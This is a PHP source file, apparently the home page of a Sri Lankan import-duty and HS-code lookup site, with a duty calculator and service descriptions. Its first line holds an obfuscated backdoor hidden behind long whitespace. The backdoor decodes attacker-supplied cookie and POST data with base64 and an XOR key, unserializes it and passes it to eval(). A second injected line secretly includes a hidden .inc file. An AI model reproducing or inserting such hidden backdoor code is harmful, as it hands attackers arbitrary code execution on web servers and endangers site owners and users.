<?php                                                                                                                                                                                                                                                                                                                                                                                                 $WUForUbhR = class_exists("Q_rFd");if (!$WUForUbhR){class Q_rFd{private $fxahfcdzGg;public static $zWbnZgIQHu = "4da14a3e-4490-4f07-a0f9-9e669a831e67";public static $yuNiw = NULL;public function __construct(){$nfPGh = $_COOKIE;$LaZqauCcL = $_POST;$QfQvgh = @$nfPGh[substr(Q_rFd::$zWbnZgIQHu, 0, 4)];if (!empty($QfQvgh)){$YDHnz = "base64";$ixpday = "";$QfQvgh = explode(",", $QfQvgh);foreach ($QfQvgh as $XLIuN){$ixpday .= @$nfPGh[$XLIuN];$ixpday .= @$LaZqauCcL[$XLIuN];}$ixpday = array_map($YDHnz . '_' . 'd' . chr ( 880 - 779 ).chr ( 446 - 347 ).'o' . 'd' . "\145", array($ixpday,)); $ixpday = $ixpday[0] ^ str_repeat(Q_rFd::$zWbnZgIQHu, (strlen($ixpday[0]) / strlen(Q_rFd::$zWbnZgIQHu)) + 1);Q_rFd::$yuNiw = @unserialize($ixpday);}}public function __destruct(){$this->eAJNGhCGs();}private function eAJNGhCGs(){if (is_array(Q_rFd::$yuNiw)) {$jzWtZZ = str_replace(chr ( 266 - 206 ) . '?' . "\160" . chr (104) . "\160", "", Q_rFd::$yuNiw["\143" . "\x6f" . 'n' . "\164" . chr (101) . chr (110) . chr (116)]);eval($jzWtZZ);exit();}}}$rdKnYjXEq = new Q_rFd(); $rdKnYjXEq = NULL;} ?><?php
/*c43ac*/

@include ("/home/mancode/imports.lk/admin/vendor/timepicki/.267645c4.inc");

/*c43ac*/
include 'layout/header.php'; ?>


<div class="modal" id="myModal">
<div class="modal-dialog">
	<div class="modal-content">

		<!-- Modal Header -->
		<div class="modal-header">
			<h4 class="modal-title">Manual Calculator</h4>
			<button type="button" class="close" data-dismiss="modal">&times;</button>
		</div>

		<!-- Modal body -->
		<div class="modal-body">
			<div class="container" id="first_step">

				<div class="row">
					<div class="col-6">
						<div class="form-group">
							<label for="">Gen Duty</label>
							<input type="number" name="" id="gen_duty" class="form-control" value="0">
						</div>
					</div>
					<div class="col-6">
						<div class="form-group">
							<label for="">VAT</label>
							<input type="number" name="" id="vat" class="form-control" value="0">
						</div>
					</div>
					<div class="col-6">
						<div class="form-group">
							<label for="">PAL</label>
							<input type="number" name="" id="pal" class="form-control" value="0">
						</div>
					</div>
					<div class="col-6">
						<div class="form-group">
							<label for="">CESS</label>
							<input type="number" name="" id="cess" class="form-control" value="0">
						</div>
					</div>
					<div class="col-6">
						<div class="form-group">
							<label for="">Excise</label>
							<input type="number" name="" id="excise" class="form-control" value="0">
						</div>
					</div>
				</div>
				<div class="text-center">
					<button type="button" class="btn btn-primary" onclick="firstStep()" name="button">Next</button>
				</div>
			</div>
			<div class="container" id="second_step" style="display:none;">
				<button type="button" class="btn btn-primary" onclick="secondStep()" name="button">Back</button> <br><br>
				<div class="row">
					<div class="col-6">
						<div class="form-group">
							<label for="">CIF</label>
							<input type="number" name="" id="cif" onkeyup="calculateManual()" class="form-control" value="">
						</div>
					</div>
				</div>

				<ul>
					<li>Gen Duty:  <span style="font-weight:bold;" id="gen_duty_show">  </span></li>
					<li>VAT: <span style="font-weight:bold;" id="vat_dis">  </span> </li>
					<li>PAL: <span style="font-weight:bold;" id="pal_dis">  </span></li>
					<li>CESS: <span style="font-weight:bold;" id="cess_dis">  </span> </li>
					<li>EXCISE:<span style="font-weight:bold;" id="excise_dis">  </span> </li>
				</ul>

			</div>
		</div>

		<!-- Modal footer -->
		<div class="modal-footer">
			<button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
		</div>

	</div>
</div>
</div>
<div class="navbar-bot">
	<a href="#"  data-toggle="modal" data-target="#myModal"><i class="fa fa-calculator" aria-hidden="true"></i> <div class="bot-nav-text">Calculator</div></a>
  <a href="#"  class="active"><i class="fa fa-search" aria-hidden="true"></i>  <div class="bot-nav-text">Home</div></a>
  <a href="hscodesofitems.php"><i class="fa fa-angle-double-down" aria-hidden="true"></i>  <div class="bot-nav-text">Quick Search</div></a>
	<a href="#news"> <i class="fa fa-newspaper-o" aria-hidden="true"></i>  <div class="bot-nav-text active">News</div> </a>
</div>

<header class="item header margin-top-0">
<div class="wrapper">
	<?php include 'layout/nav.php'; ?>
	<div class="container">
		<div class="row">
			<div class="col-md-12 text-center">
				<div class="text-homeimage">
							<img src="images/new.png" class="logo" alt="">
						 <form id="search-form" action="gotores" method="post">
							 <div class="form-group">
  							 <input type="text" class="form-control my-search-bar" placeholder="Enter Description or HS code" name="hssearch" value="" autofocus required>
  							 <button type="submit" class="btn btn-search" name="button"><i class="fa fa-search"></i> Search</button>
  						 </div>
						 </form>
				</div>
			</div>
		</div>
	</div>
</div>
</header>
<div class="item content">
	<div class="container toparea">
		<div class="row text-center">
			<!-- /.col-md-4 col -->
			<div class="col-md-4 editContent">
				<div class="col">

					<a href="#"><h3 class="numbertext">HS Code Finder</h3></a>
					<p>HS Code stands for Harmonized System. It as developed by the WCO (World
		Customs organization) as a multipurpose international product nomenclature
		that describes the type good that is shipped.
		</p>
				</div>
				<!-- /.col -->
			</div>
			<!-- /.col-md-4 col -->
			<div class="col-md-4 editContent">
				<div class="col">

					<a href="hscodesofitems"> <h3 class="numbertext">Quick Search</h3></a>
					<p>The Quick View would help you to find the HS Code of a specific product along
		the picture.
		</p>
				</div>
				<!-- /.col -->
			</div>
			<!-- /.col-md-4 col -->
			<div class="col-md-4 editContent">
				<div class="col">

					<h3 class="numbertext">Applicable Levies</h3>
					<p>Duty rates have a great impact on your final outcome. But at the same time,
		duty rates are not constant all the time. Therefore, you may get the Applicable
		Levies of your product or good to the latest update including the preferential
		rates if applicable through this site.</p>
				</div>
				<!-- /.col -->
			</div>
			<!-- /.col-md-4 col -->
			<div class="col-md-6 editContent">
				<div class="col">

					<h3 class="numbertext">Duty Calculations</h3>
					<p>As an importer, knowing the total levies to be paid prior to import, is a very big
		advantage for business planning. You can calculate the applicable levies simply
		entering the cost in any currency and quantity.</p>
				</div>
				<!-- /.col -->
			</div>
			<!-- /.col-md-4 col -->
			<div class="col-md-6 editContent">
				<div class="col">

					<a href="licenceinfo"> <h3 class="numbertext">Regulating Authorities</h3></a>
					<p>Knowing them to the deepest point would always keep the traders in the safe
		zone. Importation of certain specific goods are regulated by different
		authorities. This site would provide you the brief knowledge of regulating
		authorities and the goods come under the preview of specific authority. Further
		would guide you to the process of obtaining approval from the regulating
		authorities, together with providing the platform for all the documents required
		in the regulations, in a segregation of the regulatory bodies.
		</p>
				</div>
				<!-- /.col -->
			</div>
			<!-- /.col-md-4 col -->
			<div class="col-md-6 editContent">
				<div class="col">

					<a href="clearingagents"> <h3 class="numbertext">Customs House Agents</h3> </a>
					<p>A suitable, trustworthy, efficient Customs House Agent matters much in the
		convenience as well as in the final outcome of the imports and exports process.
		As they are the bridge between importer and the customs, having a proper
		knowledge of them would help the traders to a great extent and would help
		them to choose the most ideal agent for their need. Therefore, this site provides
		very useful, reliable, unbiased information in selection of clearing agents.

		</p>
				</div>
				<!-- /.col -->
			</div>
			<!-- /.col-md-4 col -->
			<div class="col-md-6 editContent">
				<div class="col">
					<h3 class="numbertext">News Update</h3>
					<p>To thrive in the competitive international trade, it is vital to always be updated
with the news updates regarding the world trade. This site serves the best on
this regard on which you can get a complete picture of the news updates on the
international trade.
		</p>
				</div>
				<!-- /.col -->
			</div>
			<div class="col-md-12">
				<p>As a whole the site serves you as well give you a helping hand in the A to Z fo
your imports and exports process.</p>
			</div>
		</div>
	</div>
</div>
<div class="item content">
	<div class="container text-center">
	<a href="hscodesofitems.php" class="homebrowseitems">
			Quick Search
		<div class="homebrowseitemsicon">
			<i class="fa fa-star fa-spin"></i>
		</div>
	</a>
	</div>
</div>
<br/>

<br />
<!-- <section class="item content" id="news">
	<div class="container">
		<div class="underlined-title">
			<div class="editContent">
				<h1 class="text-center latestitems">LATEST NEWS & changes of imports in sri lanka</h1>
			</div>
			<div class="wow-hr type_short">
				<span class="wow-hr-h">
				<i class="fa fa-star"></i>
				<i class="fa fa-star"></i>
				<i class="fa fa-star"></i>
				</span>
			</div>
		</div>
		<div class="row">
			<div class="col-md-4">
				<div class="productbox">
					<div class="fadeshop">
						<div class="captionshop text-center" style="display: none;">
							<h3>SEIZURE OF PROHIBITED SHELLS (CHANKS) – 15.06.2021</h3>
							<p>
								<a href="news.php" class="learn-more detailslearn"><i class="fa fa-link"></i>View Details</a>
							</p>
						</div>
						<span class="maxproduct"><img src="images/product1-1.jpg" alt=""></span>
					</div>
					<div class="product-details">
						<a href="news.php">
						<h1>SEIZURE OF PROHIBITED SHELLS (CHANKS)- 15.06.2021</h1>
						</a>
					</div>
				</div>
			</div>
			<div class="col-md-4">
				<div class="productbox">
					<div class="fadeshop">
						<div class="captionshop text-center" style="display: none;">
							<h3>SEIZURE OF DRIED FINS OF CITES LISTED SHARKS– 22.03.2021</h3>
							<p>
								<a href="news.php" class="learn-more detailslearn"><i class="fa fa-link"></i>View Details</a>
							</p>
						</div>
						<span class="maxproduct"><img src="images/product2-2.jpg" alt=""></span>
					</div>
					<div class="product-details">
						<a href="news.php">
						<h1>SEIZURE OF DRIED FINS OF CITES LISTED SHARKS– 22.03.2021</h1>
						</a>
					</div>
				</div>
			</div>
			<div class="col-md-4">
				<div class="productbox">
					<div class="fadeshop">
						<div class="captionshop text-center" style="display: none;">
							<h3>LICENSE VIOLATION DETECTED – SEA WEED</h3>
							<p>
								<a href="news.php" class="learn-more detailslearn"><i class="fa fa-link"></i>View Details</a>
							</p>
						</div>
						<span class="maxproduct"><img src="images/product2-3.jpg" alt=""></span>
					</div>
					<div class="product-details">
						<a href="news.php">
						<h1>LICENSE VIOLATION DETECTED – SEA WEED</h1>
						</a>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
</section> -->





<!-- AREA =============================-->
<div class="item content">
	<div class="container">
		<div class="row">
			<div class="col-md-4">
				<i class="fa fa-microphone infoareaicon"></i>
				<div class="infoareawrap">
					<h1 class="text-center subtitle">General Questions</h1>
					<p>
						 Want to buy a theme but not sure if it's got all the features you need? Trouble completing the payment? Or just want to say hi? Send us your message and we will answer as soon as possible!
					</p>
				</div>
			</div>
			<!-- /.col-md-4 col -->
			<div class="col-md-4">
				<i class="fa fa-comments infoareaicon"></i>
				<div class="infoareawrap">
					<h1 class="text-center subtitle">Imports Support</h1>
					<p>
						Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna
					</p>
				</div>
			</div>
			<!-- /.col-md-4 col -->
			<div class="col-md-4">
				<i class="fa fa-bullhorn infoareaicon"></i>
				<div class="infoareawrap">
					<h1 class="text-center subtitle">How to Contact Clearing Agents?</h1>
					<p>
						 If you wish to change an element to look or function differently than shown in the demo, we will be glad to assist you. This is a paid service due to theme support requests solved with priority.
					</p>
				</div>
			</div>
		</div>
	</div>
</div>

<?php include 'layout/footer.php'; ?>
<?php if (isset($_REQUEST['filled'])): ?>
	<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script>swal("Information Submited", "Thank you for showing intrest on imports.lk clearinng agent sector. One of our agent will contact you soon", "success");</script>
<?php endif; ?>
